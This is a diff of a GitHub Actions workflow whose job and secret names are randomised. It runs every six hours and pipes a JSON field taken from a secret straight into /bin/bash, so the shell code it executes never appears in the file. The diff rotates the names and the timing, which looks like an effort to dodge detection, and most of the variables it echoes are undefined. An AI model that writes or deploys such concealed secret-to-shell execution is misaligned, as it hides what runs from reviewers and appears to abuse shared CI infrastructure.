@@ -3,28 +3,19 @@ name: heziwei6781
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
+    - cron: '56 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: heziwei6781
         env:
-          hcgq4: ${{ secrets.hcgq4 }}
+          sxrob7: ${{ secrets.sxrob7 }}
         run: |
-          echo $hcgq4 | jq -r .th8567 | /bin/bash
-          echo $lrckb58112 | jq -r .u18697 | /bin/bash
-          echo $bpljm49 | jq -r .qlht8 | /bin/bash
-          echo $vf65 | jq -r .pa89365 | /bin/bash
-          echo $flm3 | jq -r .daq50397 | /bin/bash
-          echo $qjx418 | jq -r .ugpy04023 | /bin/bash
-          echo $l129 | jq -r .cgpi6105 | /bin/bash
-          echo $zbqm49 | jq -r .w04133 | /bin/bash
-          echo $wd6 | jq -r .upfjd121 | /bin/bash
-          echo $dwp6807 | jq -r .mde783 | /bin/bash
-          echo $kbzdb8110 | jq -r .wjc28625 | /bin/bash
-          echo $xchbw7 | jq -r .yk34 | /bin/bash
-          echo $zskir54 | jq -r .yiyh7081 | /bin/bash
+          echo $sxrob7 | jq -r .qe40762 | /bin/bash
+          echo $ylr3866 | jq -r .p5002 | /bin/bash
+          echo $qm9 | jq -r .msv0106 | /bin/bash
+          echo $wtdu2 | jq -r .ib99 | /bin/bash
+          echo $kpjjk62584 | jq -r .yezs04806 | /bin/bash
 
